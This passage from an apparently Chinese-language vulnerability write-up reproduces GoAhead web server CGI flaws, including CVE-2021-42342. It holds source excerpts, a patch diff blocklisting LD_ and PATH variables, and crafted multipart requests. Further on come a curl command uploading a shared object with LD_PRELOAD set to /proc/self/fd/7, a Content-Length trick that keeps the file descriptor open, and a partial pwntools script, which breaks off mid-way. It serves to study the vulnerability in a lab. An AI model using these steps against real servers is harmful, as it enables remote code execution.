</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(wp-&gt;cgiStdin == </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        wp-&gt;cgiStdin = </span><span style="color:#8fa1b3;">websGetCgiCommName</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    stdIn = wp-&gt;cgiStdin;
</span><span style="color:#c0c5ce;">    stdOut = </span><span style="color:#8fa1b3;">websGetCgiCommName</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(wp-&gt;cgifd &gt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(wp-&gt;cgifd);
</span><span style="color:#c0c5ce;">        wp-&gt;cgifd = -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">        Now launch the process.  If not successful, do the cleanup of resources.  If successful, the cleanup will be
</span><span style="color:#65737e;">        done after the process completes.
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((pHandle = </span><span style="color:#8fa1b3;">launchCgi</span><span style="color:#c0c5ce;">(cgiPath, argp, envp, stdIn, stdOut)) == (CgiPid) -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">websError</span><span style="color:#c0c5ce;">(wp, HTTP_CODE_INTERNAL_SERVER_ERROR, &quot;</span><span style="color:#a3be8c;">failed to spawn CGI task</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        ...
</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{ ... }
</span></pre>
<p>启动cgi的时候会用临时文件重定向为cgi进程的输入输出</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;">    Launch the CGI process and return a handle to it.
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> CgiPid </span><span style="color:#8fa1b3;">launchCgi</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">cgiPath</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">argp</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">envp</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">stdIn</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">stdOut</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">     fdin, fdout, pid;
</span><span style="color:#c0c5ce;">    ...
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((fdin = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(stdIn, O_RDWR | O_CREAT | O_BINARY, </span><span style="color:#d08770;">0666</span><span style="color:#c0c5ce;">)) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">error</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Cannot open CGI stdin: </span><span style="color:#c0c5ce;">&quot;, cgiPath);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((fdout = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(stdOut, O_RDWR | O_CREAT | O_TRUNC | O_BINARY, </span><span style="color:#d08770;">0666</span><span style="color:#c0c5ce;">)) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">error</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Cannot open CGI stdout: </span><span style="color:#c0c5ce;">&quot;, cgiPath);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    pid = </span><span style="color:#8fa1b3;">vfork</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(pid == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">            Child
</span><span style="color:#65737e;">         */
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">dup2</span><span style="color:#c0c5ce;">(fdin, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">content-type: text/html</span><span style="color:#96b5b4;">\n\n</span><span style="color:#a3be8c;">Dup of stdin failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">_exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        } </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">dup2</span><span style="color:#c0c5ce;">(fdout, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">content-type: text/html</span><span style="color:#96b5b4;">\n\n</span><span style="color:#a3be8c;">Dup of stdout failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">_exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        } </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">execve</span><span style="color:#c0c5ce;">(cgiPath, argp, envp) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">content-type: text/html</span><span style="color:#96b5b4;">\n\n</span><span style="color:#a3be8c;">Execution of cgi process failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">_exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    ...
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> pid;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="li-yong">利用</h3><p>需要知道<a href="../../0basic/LD_PRELOAD%E5%8A%AB%E6%8C%81.md">LD_PRELOAD劫持</a></p>
<p>第一种比较朴素的方法
通过前面分析知道，post的报文内容会被存放到<code>/tmp/cgi-*.tmp</code>，可以先将恶意so作为post参数上传，之后再爆破文件名完成利用</p>
<p>第二种方法
利用<code>/proc/self/fd/0</code>。<code>/proc/self/fd/0</code>是指向自己进程的标准输入，对于cgi进程来说，由于它的标准输入被重定向到了tmp文件，所以<code>/proc/self/fd/0</code>也就指向其post报文的参数，从而无需爆破tmp文件名</p>
<h3 id="bu-ding">补丁</h3><p>切到v3.6.5，加了黑名单，过滤一些系统变量</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">git diff  tags/v3.6.4 tags/v3.6.5 src/cgi.c &gt; tmp
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">diff --git a/src/cgi.c b/src/cgi.c
</span><span style="color:#c0c5ce;">index 899ec97b..65b38556 100644
</span><span style="color:#c0c5ce;">--- a/src/cgi.c
</span><span style="color:#c0c5ce;">+++ b/src/cgi.c
</span><span style="color:#c0c5ce;">@@ -62,7 +62,7 @@ PUBLIC bool cgiHandler(Webs *wp)
</span><span style="color:#c0c5ce;">     websSetEnv(wp);
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">     /*
</span><span style="color:#bf616a;">-        Extract the form name and then build the full path name.  The form name will follow the first &#39;/&#39; in path.
</span><span style="color:#a3be8c;">+        Extract the form name and then build the full path name. The form name will follow the first &#39;/&#39; in path.
</span><span style="color:#c0c5ce;">      */
</span><span style="color:#c0c5ce;">     scopy(cgiPrefix, sizeof(cgiPrefix), wp-&gt;path);
</span><span style="color:#c0c5ce;">     if ((cgiName = strchr(&amp;cgiPrefix[1], &#39;/&#39;)) == NULL) {
</span><span style="color:#c0c5ce;">@@ -151,20 +151,32 @@ PUBLIC bool cgiHandler(Webs *wp)
</span><span style="color:#c0c5ce;">     *(argp+n) = NULL;
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">     /*
</span><span style="color:#bf616a;">-        Add all CGI variables to the environment strings to be passed to the spawned CGI process. This includes a few
</span><span style="color:#bf616a;">-        we don&#39;t already have in the symbol table, plus all those that are in the vars symbol table. envp will point
</span><span style="color:#bf616a;">-        to a walloc&#39;d array of pointers. Each pointer will point to a walloc&#39;d string containing the keyword value pair
</span><span style="color:#bf616a;">-        in the form keyword=value. Since we don&#39;t know ahead of time how many environment strings there will be the for
</span><span style="color:#a3be8c;">+        Add all CGI variables to the environment strings to be passed to the spawned CGI process.
</span><span style="color:#a3be8c;">+        This includes a few we don&#39;t already have in the symbol table, plus all those that are in
</span><span style="color:#a3be8c;">+        the vars symbol table. envp will point to a walloc&#39;d array of pointers. Each pointer will
</span><span style="color:#a3be8c;">+        point to a walloc&#39;d string containing the keyword value pair in the form keyword=value.
</span><span style="color:#a3be8c;">+        Since we don&#39;t know ahead of time how many environment strings there will be the for
</span><span style="color:#c0c5ce;">         loop includes logic to grow the array size via wrealloc.
</span><span style="color:#c0c5ce;">      */
</span><span style="color:#c0c5ce;">     envpsize = 64;
</span><span style="color:#c0c5ce;">     envp = walloc(envpsize * sizeof(char*));
</span><span style="color:#c0c5ce;">     for (n = 0, s = hashFirst(wp-&gt;vars); s != NULL; s = hashNext(wp-&gt;vars, s)) {
</span><span style="color:#bf616a;">-        if (s-&gt;content.valid &amp;&amp; s-&gt;content.type == string &amp;&amp;
</span><span style="color:#bf616a;">-            strcmp(s-&gt;name.value.string, &quot;REMOTE_HOST&quot;) != 0 &amp;&amp;
</span><span style="color:#bf616a;">-            strcmp(s-&gt;name.value.string, &quot;HTTP_AUTHORIZATION&quot;) != 0) {
</span><span style="color:#bf616a;">-            envp[n++] = sfmt(&quot;%s=%s&quot;, s-&gt;name.value.string, s-&gt;content.value.string);
</span><span style="color:#bf616a;">-            trace(5, &quot;Env[%d] %s&quot;, n, envp[n-1]);
</span><span style="color:#a3be8c;">+        if (s-&gt;content.valid &amp;&amp; s-&gt;content.type == string) {
</span><span style="color:#a3be8c;">+            if (smatch(s-&gt;name.value.string, &quot;REMOTE_HOST&quot;) ||
</span><span style="color:#a3be8c;">+                smatch(s-&gt;name.value.string, &quot;HTTP_AUTHORIZATION&quot;) ||
</span><span style="color:#a3be8c;">+                smatch(s-&gt;name.value.string, &quot;IFS&quot;) ||
</span><span style="color:#a3be8c;">+                smatch(s-&gt;name.value.string, &quot;CDPATH&quot;) ||
</span><span style="color:#a3be8c;">+                smatch(s-&gt;name.value.string, &quot;PATH&quot;) ||
</span><span style="color:#a3be8c;">+                sstarts(s-&gt;name.value.string, &quot;LD_&quot;)) {
</span><span style="color:#a3be8c;">+                continue;
</span><span style="color:#a3be8c;">+            }
</span><span style="color:#a3be8c;">+            if (s-&gt;arg != 0 &amp;&amp; *ME_GOAHEAD_CGI_VAR_PREFIX != &#39;\0&#39;) {
</span><span style="color:#a3be8c;">+                envp[n++] = sfmt(&quot;%s%s=%s&quot;, ME_GOAHEAD_CGI_VAR_PREFIX, s-&gt;name.value.string,
</span><span style="color:#a3be8c;">+                    s-&gt;content.value.string);
</span><span style="color:#a3be8c;">+            } else {
</span><span style="color:#a3be8c;">+                envp[n++] = sfmt(&quot;%s=%s&quot;, s-&gt;name.value.string, s-&gt;content.value.string);
</span><span style="color:#a3be8c;">+            }
</span><span style="color:#a3be8c;">+            trace(0, &quot;Env[%d] %s&quot;, n, envp[n-1]);
</span><span style="color:#c0c5ce;">             if (n &gt;= envpsize) {
</span><span style="color:#c0c5ce;">                 envpsize *= 2;
</span><span style="color:#c0c5ce;">                 envp = wrealloc(envp, envpsize * sizeof(char *));
</span><span style="color:#c0c5ce;">
</span></pre>
<h2 id="cve-2021-42342">CVE-2021-42342</h2><h3 id="miao-shu">描述</h3><blockquote>
<p>近日爆出GoAhead存在RCE漏洞，漏洞源于文件上传过滤器的处理缺陷，当与CGI处理程序一起使用时，可影响环境变量，从而导致RCE。漏洞影响版本为：</p>
<p>GoAhead =4.x
5.x&lt;=GoAhead&lt;5.1.5</p>
</blockquote>
<h3 id="huan-jing">环境</h3><p>这里有个坑，新版本goahead默认没有开启CGI配置，而老版本如果没有cgi-bin目录或里面没有cgi文件，也不受这个漏洞影响。所以影响相对没有那么广泛</p>
<p>这里选择v5.1.3版本搭建环境，去掉CGI相关配置注释：</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">diff --git a/src/route.txt b/src/route.txt
</span><span style="color:#c0c5ce;">index 4dda7078..18bee21f 100644
</span><span style="color:#c0c5ce;">--- a/src/route.txt
</span><span style="color:#c0c5ce;">+++ b/src/route.txt
</span><span style="color:#c0c5ce;">@@ -31,7 +31,7 @@
</span><span style="color:#c0c5ce;"> #
</span><span style="color:#c0c5ce;"> #   Standard routes
</span><span style="color:#c0c5ce;"> #
</span><span style="color:#bf616a;">-# route uri=/cgi-bin dir=cgi-bin handler=cgi
</span><span style="color:#a3be8c;">+route uri=/cgi-bin dir=cgi-bin handler=cgi
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;"> route uri=/action handler=action
</span></pre>
<p><code>cgi-bin/test</code>内容</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">#!/bin/bash
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">echo -e &quot;Content-Type: text/plain\n&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">env
</span></pre>
<p>后续参考<a href="../../../windows/HEVD/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">环境搭建</a></p>
<h3 id="fu-xian">复现</h3><blockquote>
<p>注意最后还需要有一行回车，否则下面代码将报文识别为未结束</p>
</blockquote>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">// src/upload.c:120
</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((nextTok = </span><span style="color:#96b5b4;">memchr</span><span style="color:#c0c5ce;">(line, &#39;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#8fa1b3;">bufLen</span><span style="color:#c0c5ce;">(&amp;wp-&gt;input))) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#65737e;">/* Incomplete line */
</span><span style="color:#c0c5ce;">                canProceed = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">POST /cgi-bin/test HTTP/1.1
</span><span style="color:#c0c5ce;">Host: 192.168.130.133:8888
</span><span style="color:#c0c5ce;">Cache-Control: max-age=0
</span><span style="color:#c0c5ce;">Upgrade-Insecure-Requests: 1
</span><span style="color:#c0c5ce;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span><span style="color:#c0c5ce;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span><span style="color:#c0c5ce;">Accept-Encoding: gzip, deflate
</span><span style="color:#c0c5ce;">Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-GB;q=0.6,en-US;q=0.5
</span><span style="color:#c0c5ce;">Connection: close
</span><span style="color:#c0c5ce;">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylNDKbe0ngCGdEiPM
</span><span style="color:#c0c5ce;">Content-Length: 145
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">------WebKitFormBoundarylNDKbe0ngCGdEiPM
</span><span style="color:#c0c5ce;">Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">test
</span><span style="color:#c0c5ce;">------WebKitFormBoundarylNDKbe0ngCGdEiPM--
</span><span style="color:#c0c5ce;">
</span></pre>
<p><img src="./images/Pasted%20image%2020240928001042.png" alt="" /></p>
<p>和PHP一样，GoAhead遇到上传表单时，会将这个上传的文件保存在一个临时目录下，待脚本程序处理完后会删掉这个临时文件</p>
<p>上传文件数据包</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">POST /cgi-bin/test HTTP/1.1
</span><span style="color:#c0c5ce;">Host: 192.168.130.133:8888
</span><span style="color:#c0c5ce;">Cache-Control: max-age=0
</span><span style="color:#c0c5ce;">Upgrade-Insecure-Requests: 1
</span><span style="color:#c0c5ce;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span><span style="color:#c0c5ce;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span><span style="color:#c0c5ce;">Accept-Encoding: gzip, deflate
</span><span style="color:#c0c5ce;">Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-GB;q=0.6,en-US;q=0.5
</span><span style="color:#c0c5ce;">Connection: close
</span><span style="color:#c0c5ce;">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylNDKbe0ngCGdEiPM
</span><span style="color:#c0c5ce;">Content-Length: 185
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">------WebKitFormBoundarylNDKbe0ngCGdEiPM
</span><span style="color:#c0c5ce;">Content-Disposition: form-data; name=&quot;data&quot;; filename=&quot;1.txt&quot;
</span><span style="color:#c0c5ce;">Content-Type: text/plain
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">ayoung
</span><span style="color:#c0c5ce;">------WebKitFormBoundarylNDKbe0ngCGdEiPM--
</span><span style="color:#c0c5ce;">
</span></pre>
<p>监控系统调用</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ayoung@ay:~/goahead/test$ sudo strace -p `pidof goahead` -e trace=open,openat,unlink
</span><span style="color:#c0c5ce;">strace: Process 118157 attached
</span><span style="color:#c0c5ce;">openat(AT_FDCWD, &quot;/tmp/cgi-63.tmp&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
</span><span style="color:#c0c5ce;">openat(AT_FDCWD, &quot;tmp/tmp-64.tmp&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0600) = 7
</span><span style="color:#c0c5ce;">openat(AT_FDCWD, &quot;/tmp/cgi-63.tmp&quot;, O_RDWR|O_CREAT, 0666) = 6
</span><span style="color:#c0c5ce;">openat(AT_FDCWD, &quot;/tmp/cgi-65.tmp&quot;, O_RDWR|O_CREAT|O_TRUNC, 0666) = 7
</span><span style="color:#c0c5ce;">--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=119260, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
</span><span style="color:#c0c5ce;">openat(AT_FDCWD, &quot;/tmp/cgi-65.tmp&quot;, O_RDONLY) = 6
</span><span style="color:#c0c5ce;">unlink(&quot;/tmp/cgi-63.tmp&quot;)               = 0
</span><span style="color:#c0c5ce;">unlink(&quot;/tmp/cgi-65.tmp&quot;)               = 0
</span><span style="color:#c0c5ce;">unlink(&quot;tmp/tmp-64.tmp&quot;)                = 0
</span><span style="color:#c0c5ce;">
</span></pre>
<p>想要执行上面返回包成功，还需要文件要被写入的目录可写；按照<a href="../../../windows/HEVD/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">环境搭建</a>方法搭建环境，在<code>test</code>目录启动，不会出现错误</p>
<p>使用下面命令发送payload</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">curl -v -F data=@exp.so -F &quot;LD_PRELOAD=/proc/self/fd/7&quot; http://192.168.130.133:8888/cgi-bin/test
</span></pre>
<blockquote>
<p>-F 上传二进制文件</p>
</blockquote>
<p>尝试不同fd，大概有三类报错：</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ERROR: ld.so: object &#39;/proc/self/fd/1&#39; from LD_PRELOAD cannot be preloaded (invalid ELF header): ignored.
</span><span style="color:#c0c5ce;">ERROR: ld.so: object &#39;/proc/self/fd/6&#39; from LD_PRELOAD cannot be preloaded (file too short): ignored.
</span><span style="color:#c0c5ce;">ERROR: ld.so: object &#39;/proc/self/fd/8&#39; from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
</span></pre>
<p>修改<code>cgi-bin/test</code>，这里我的实验环境临时文件会写入test目录下的tmp</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">#!/bin/bash
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">echo -e &quot;Content-Type: text/plain\n&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">ls -al /proc/self/fd/
</span><span style="color:#c0c5ce;">ls -al /home/ayoung/goahead/test/tmp
</span></pre>
<p>返回数据包：</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">HTTP/1.1 200 OK
</span><span style="color:#c0c5ce;">Date: Tue Oct  1 13:29:47 2024
</span><span style="color:#c0c5ce;">Connection: close
</span><span style="color:#c0c5ce;">X-Frame-Options: SAMEORIGIN
</span><span style="color:#c0c5ce;">Pragma: no-cache
</span><span style="color:#c0c5ce;">Cache-Control: no-cache
</span><span style="color:#c0c5ce;">Content-Type:  text/plain
</span><span style="color:#c0c5ce;">Content-Length: 733
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">total 0
</span><span style="color:#c0c5ce;">dr-x------ 2 root root  7 Oct  1 21:29 .
</span><span style="color:#c0c5ce;">dr-xr-xr-x 9 root root  0 Oct  1 21:29 ..
</span><span style="color:#c0c5ce;">lrwx------ 1 root root 64 Oct  1 21:29 0 -&gt; /tmp/cgi-75.tmp
</span><span style="color:#c0c5ce;">lrwx------ 1 root root 64 Oct  1 21:29 1 -&gt; /tmp/cgi-77.tmp
</span><span style="color:#c0c5ce;">lrwx------ 1 root root 64 Oct  1 21:29 2 -&gt; /dev/pts/1
</span><span style="color:#c0c5ce;">l-wx------ 1 root root 64 Oct  1 21:29 3 -&gt; /home/ayoung/goahead/test/a
</span><span style="color:#c0c5ce;">lr-x------ 1 root root 64 Oct  1 21:29 4 -&gt; /proc/120012/fd
</span><span style="color:#c0c5ce;">lrwx------ 1 root root 64 Oct  1 21:29 6 -&gt; /tmp/cgi-75.tmp
</span><span style="color:#c0c5ce;">lrwx------ 1 root root 64 Oct  1 21:29 7 -&gt; /tmp/cgi-77.tmp
</span><span style="color:#c0c5ce;">total 12
</span><span style="color:#c0c5ce;">drwxrwxr-x  2 ayoung ayoung 4096 Oct  1 21:29 .
</span><span style="color:#c0c5ce;">drwxrwxr-x 16 ayoung ayoung 4096 Oct  1 18:30 ..
</span><span style="color:#c0c5ce;">-rw-rw-r--  1 ayoung ayoung    0 Sep 19 21:51 .keep
</span><span style="color:#c0c5ce;">-rw-------  1 root   root      6 Oct  1 21:29 tmp-76.tmp
</span><span style="color:#c0c5ce;">...
</span></pre>
<p>会发现tmp目录下有<code>tmp-76.tmp</code>，但<code>/proc/self/fd</code>中没有相关文件描述符。可能cgi此时已经将临时文件关闭了</p>
<p>考虑什么情况下可以让这个文件描述符不关闭</p>
<p>一种是使用两个线程，线程一流式缓慢上传文件，线程二使用<code>LD_PRELOAD</code>包含这个文件
同时给payload.so文件内容后增加一些脏字符，并将HTTP的Content-Length设置成小于最终的数据包Body大小。这样，GoAhead读取数据包的时候能够完全读取到payload.so的内容，但实际这个文件并没有上传完毕</p>
<p>第二种不需要线程或竞争
首先构造好之前那个无法利用的数据包，其中第一个表单字段是<code>LD_PRELOAD</code>，值是文件描述符，一般是<code>/proc/self/fd/7</code>。然后改造这个数据包：</p>
<ul>
<li>给payload.so文件末尾增加几千个字节的脏字符，比如说a（右键 <code>paste from file</code>上传）</li>
<li>关掉burpsuite自动的“Update Content-Length”（顶部菜单栏<code>Repeater</code>里）</li>
<li>将数据包的Content-Length设置为不超过16384的值，但需要比<code>payload.so</code>文件的大小要大个500字节左右，这里设置为15000</li>
</ul>
<p>实操过程中，我使用burp发包有些字节丢失导致报错：
<code>ERROR: ld.so: object '/proc/self/fd/7' from LD_PRELOAD cannot be preloaded (invalid ELF header): ignored.</code></p>
<p>使用脚本发送请求，成功复现</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import</span><span style="color:#d08770;">*
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">r = </span><span style="color:#8fa1b3;">remote</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">192.168.130.133</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">8888</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">exp.so</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">rb</span><span style="color:#c0c5ce;">&quot;) </span><span style="color:#b48ead;">as </span><span style="color:#c0c5ce;">f:
</span><span style="color:#c0c5ce;">    expso = f.</span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">_packet = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&#39;&#39;&#39;</span><span style="color:#a3be8c;">POST /cgi-bin/test HTTP/1.1</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Host: 192.168.130.133:8888</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Cache-Control: max-age=0</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Upgrade-Insecure-Requests: 1</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Accept-Encoding: gzip, deflate</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-GB;q=0.6,en-US;q=0.5</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Connection: close</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylNDKbe0ngCGdEiPM</span><span style="color:#96b5b4;">\r
